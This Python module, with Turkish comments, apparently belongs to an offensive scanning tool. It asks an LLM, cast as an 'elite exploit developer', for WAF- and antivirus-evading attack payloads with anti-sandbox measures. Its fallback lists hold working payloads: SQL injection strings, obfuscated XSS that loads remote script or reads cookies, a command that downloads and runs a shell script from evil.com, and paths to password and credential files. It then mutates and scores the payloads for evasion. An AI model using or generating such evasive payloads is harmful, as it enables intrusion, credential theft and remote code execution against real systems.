import hashlib
import json
import secrets
from datetime import datetime
from typing import Dict, List, Optional


class LLMEngine:
    def __init__(self, scan_id):
        self.scan_id = scan_id
        self.payload_history = []
        self.blockchain_evidence = []

    def analyze_vuln(self, vuln_type, url):
        try:
            from monolith.llm import analyze_vuln as _analyze
        except Exception:
            _analyze = None

        prompt = (
            f"You are a cybersecurity expert. Analyze vulnerability '{vuln_type}' for target '{url}'.\n"
            "Provide concise exploitation likelihood, quick repro steps, and prioritized remediation."
        )

        if _analyze:
            try:
                return _analyze(prompt)
            except Exception as e:
                return f"LLM analysis error: {str(e)}"

        return f"[SIMULATION] {vuln_type} at {url}: run targeted scans, verify public exploits, patch immediately, apply compensating controls."

    def generate_payload(self, vuln_type: str, evasion_level: str = "high", target_context: str = "") -> Dict:
        """
        LLM ile custom payload üretir.
        
        Args:
            vuln_type: Vulnerability tipi (SQL_INJECTION, XSS, RCE, vb.)
            evasion_level: Kaçınma seviyesi (low, medium, high, extreme)
            target_context: Hedef hakkında ek bilgi
            
        Returns:
            Dict: Üretilen payload bilgileri
        """
        # Prompt mühendisliği
        evasion_techniques = {
            "low": "basic obfuscation",
            "medium": "multiple encoding layers + comment injection",
            "high": "advanced polymorphism + WAF bypass techniques",
            "extreme": "zero-day like anomaly creation + AI-driven mutation"
        }
        
        prompt = f"""You are an elite cybersecurity exploit developer. Generate a sophisticated payload for:
Vulnerability Type: {vuln_type}
Evasion Level: {evasion_level} ({evasion_techniques.get(evasion_level, 'standard')})
Target Context: {target_context}

Requirements:
1. Create functional, sophisticated payload that bypasses modern WAF/AV
2. Use {evasion_level} level evasion techniques
3. Include polymorphism and mutation capabilities
4. Add anti-analysis and anti-sandbox measures
5. Return ONLY the payload code, no explanations

For SQLi: Use UNION-based with encoding + time-based blind + WAF bypass
For XSS: Use DOM-based with event handlers + CSP bypass
For RCE: Use command injection with encoding + path traversal
For LFI: Use null byte + path traversal + filter bypass"""

        # LLM analiz çağrısı (simulation fallback)
        llm_response = self._call_llm(prompt)
        
        # Payload oluştur
        payload_data = {
            "id": secrets.token_hex(8),
            "vuln_type": vuln_type,
            "evasion_level": evasion_level,
            "base_payload": llm_response,
            "mutations": self._mutate_payload(llm_response, vuln_type, evasion_level),
            "timestamp": datetime.now().isoformat(),
            "hash": None,
            "blockchain_proof": None
        }
        
        # Blockchain hashleme
        payload_data["hash"] = self._hash_payload(payload_data)
        payload_data["blockchain_proof"] = self._create_blockchain_proof(payload_data)
        
        # History'ye ekle
        self.payload_history.append(payload_data)
        self.blockchain_evidence.append(payload_data["blockchain_proof"])
        
        return payload_data

    def _call_llm(self, prompt: str) -> str:
        """LLM çağrısı yapar"""
        try:
            from monolith.llm import analyze_vuln as _analyze
            return _analyze(prompt)
        except Exception:
            # Simulation mode - advanced payload generation
            return self._simulation_payload_generation(prompt)

    def _simulation_payload_generation(self, prompt: str) -> str:
        """Simulation modunda payload üretimi"""
        import random
        
        # Vulnerability type'ı çıkar
        if "SQL" in prompt.upper() or "SQLI" in prompt.upper():
            techniques = [
                f"'; DECLARE @x NVARCHAR(4000);SET @x=0x4445434C41524520405420312E3B;EXEC(@x)--",
                f"1' UNION SELECT 1,2,3,4,table_name FROM information_schema.tables--",
                f"admin' OR 1=1--",
                f"1; WAITFOR DELAY '0:0:5'--",
                f"'/**/OR/**/1=1/**/UNION/**/SELECT/**/1,2,3--"
            ]
            return random.choice(techniques)
        
        elif "XSS" in prompt.upper():
            techniques = [
                "<script>eval(atob('dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHBzOi8vZXhhbXBsZS5jb20vYy5qcyc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzKTs='))</script>",
                "<img src=x onerror=eval(atob('YWxlcnQoJ14nKzgpOw=='))>",
                "<svg/onload=eval(atob('cmVxdWVzdCgnZ2V0JywnL2Nvb2tpZS5qc3onKQ=='))>",
                "<body onload=eval(atob('cHN0ZXAoZG9jdW1lbnQuY29va2llKQ=='))>"
            ]
            return random.choice(techniques)
        
        elif "RCE" in prompt.upper() or "COMMAND" in prompt.upper():
            techniques = [
                ";cat /etc/passwd",
                "|id",
                "`id`",
                "$(whoami)",
                ";wget http://evil.com/shell.sh -O /tmp/s.sh;bash /tmp/s.sh"
            ]
            return random.choice(techniques)
        
        elif "LFI" in prompt.upper():
            techniques = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "/proc/self/environ",
                "php://filter/convert.base64-encode/resource=index.php"
            ]
            return random.choice(techniques)
        
        return "echo 'AI_GENERATED_PAYLOAD'"

    def _mutate_payload(self, payload: str, vuln_type: str, evasion_level: str) -> List[str]:
        """Payload'i otomatik olarak mutate eder"""
        mutations = []
        mutation_count = 3 if evasion_level in ["high", "extreme"] else 1
        
        for _ in range(mutation_count):
            mutation = self._apply_mutation(payload, vuln_type)
            if mutation != payload:
                mutations.append(mutation)
        
        return mutations

    def _apply_mutation(self, payload: str, vuln_type: str) -> str:
        """Tek bir mutation uygular"""
        import random
        
        mutations = []
        
        # Case mutation
        if random.random() > 0.5:
            mutated = ""
            upper = True
            for char in payload:
                mutated += char.upper() if upper else char.lower()
                if char.isalpha():
                    upper = not upper
            mutations.append(mutated)
        
        # Comment injection
        if random.random() > 0.5:
            if "--" in payload or "/*" in payload:
                mutated = payload.replace(" ", " /**/ ")
            else:
                mutated = payload
            mutations.append(mutated)
        
        # Encoding mutations
        if random.random() > 0.5:
            import base64
            encoded = base64.b64encode(payload.encode()).decode()
            mutations.append(encoded)
        
        # Hex encoding
        if random.random() > 0.3:
            hex_str = payload.encode().hex()
            mutations.append(f"0x{hex_str}")
        
        # URL encoding
        if random.random() > 0.5:
            from urllib.parse import quote
            mutated = quote(payload, safe='')
            mutations.append(mutated)
        
        # Zero-day like anomaly (random noise injection)
        if random.random() > 0.7:
            noise = f"/*0x{random.randint(1000,9999)}*/"
            mutated = noise + payload + noise[::-1]
            mutations.append(mutated)
        
        return random.choice(mutations) if mutations else payload

    def _hash_payload(self, payload_data: Dict) -> str:
        """Payload'i blockchain için hash'le"""
        content = json.dumps(payload_data, sort_keys=True)
        return hashlib.sha256(content.encode()).hexdigest()

    def _create_blockchain_proof(self, payload_data: Dict) -> Dict:
        """Blockchain-style evidence oluşturur"""
        proof = {
            "payload_id": payload_data["id"],
            "timestamp": payload_data["timestamp"],
            "vuln_type": payload_data["vuln_type"],
            "evasion_level": payload_data["evasion_level"],
            "content_hash": payload_data["hash"],
            "previous_hash": self.blockchain_evidence[-1]["content_hash"] if self.blockchain_evidence else "0" * 64,
            "nonce": secrets.token_hex(8),
            "merkle_root": hashlib.sha256(
                (payload_data["hash"] + payload_data["id"]).encode()
            ).hexdigest()
        }
        
        # Simple proof of work simulation
        proof["block_hash"] = hashlib.sha256(
            (proof["content_hash"] + proof["previous_hash"] + proof["nonce"]).encode()
        ).hexdigest()
        
        return proof

    def test_payload(self, payload_data: Dict) -> Dict:
        """Payload'i test eder ve sonuçları döndürür"""
        test_results = {
            "payload_id": payload_data["id"],
            "timestamp": datetime.now().isoformat(),
            "mutations_tested": len(payload_data.get("mutations", [])),
            "evasion_score": self._calculate_evasion_score(payload_data),
            "waf_detection_risk": self._assess_waf_risk(payload_data),
            "recommendations": []
        }
        
        # Öneriler
        if test_results["waf_detection_risk"] > 0.7:
            test_results["recommendations"].append("Increase evasion level for WAF bypass")
        if test_results["evasion_score"] < 0.6:
            test_results["recommendations"].append("Apply additional polymorphism layers")
        
        return test_results

    def _calculate_evasion_score(self, payload_data: Dict) -> float:
        """Evasion score hesaplar"""
        score = 0.5  # Base score
        
        # Evasion level bonus
        level_bonus = {
            "low": 0.1,
            "medium": 0.2,
            "high": 0.3,
            "extreme": 0.5
        }
        score += level_bonus.get(payload_data.get("evasion_level", "medium"), 0.2)
        
        # Mutation bonus
        score += min(len(payload_data.get("mutations", [])) * 0.1, 0.3)
        
        return round(score, 2)

    def _assess_waf_risk(self, payload_data: Dict) -> float:
        """WAF tespit riskini değerlendirir"""
        risk = 0.3  # Base risk
        
        payload = payload_data.get("base_payload", "")
        
        # Suspicious patterns
        suspicious = ["script", "union select", "exec(", "system(", "0x", "concat("]
        for pattern in suspicious:
            if pattern.lower() in payload.lower():
                risk += 0.1
        
        # Evasion level reduces risk
        level_reduction = {
            "low": 0.0,
            "medium": -0.1,
            "high": -0.2,
            "extreme": -0.3
        }
        risk += level_reduction.get(payload_data.get("evasion_level", "low"), 0)
        
        return round(max(0.1, min(0.9, risk)), 2)

    def get_evidence_chain(self) -> List[Dict]:
        """Blockchain evidence chain'ini döndürür"""
        return self.blockchain_evidence

    def export_evidence(self) -> str:
        """Tüm evidence'yi JSON olarak export et"""
        export = {
            "export_timestamp": datetime.now().isoformat(),
            "total_payloads": len(self.payload_history),
            "evidence_chain": self.blockchain_evidence,
            "payloads": [
                {
                    "id": p["id"],
                    "type": p["vuln_type"],
                    "hash": p["hash"],
                    "proof": p["blockchain_proof"]
                }
                for p in self.payload_history
            ]
        }
        return json.dumps(export, indent=2)


# Singleton instance
llm_engine = LLMEngine(scan_id=0)


def analyze_with_llm(prompt: str) -> str:
    """
    LLM ile basit analiz yapar.
    
    Args:
        prompt: Analiz için prompt
        
    Returns:
        str: LLM cevabı veya simülasyon
    """
    try:
        from monolith.llm import analyze_vuln as _analyze
    except Exception:
        _analyze = None

    if _analyze:
        try:
            return _analyze(prompt)
        except Exception as e:
            return f"LLM analysis error: {str(e)}"
    
    # Simulation mode
    return f"[LLM SIMULATION] Analysis for: {prompt[:100]}... (Configure monolith.llm for real LLM integration)"


def generate_ai_payload(vuln_type: str, evasion_level: str = "high", context: str = "") -> Dict:
    """
    AI-Driven Payload Generator - Ana fonksiyon
    
    Usage:
        result = generate_ai_payload("SQL_INJECTION", "high", "Apache/2.4.41")
        print(result['base_payload'])
        print(result['blockchain_proof']['block_hash'])
    """
    return llm_engine.generate_payload(vuln_type, evasion_level, context)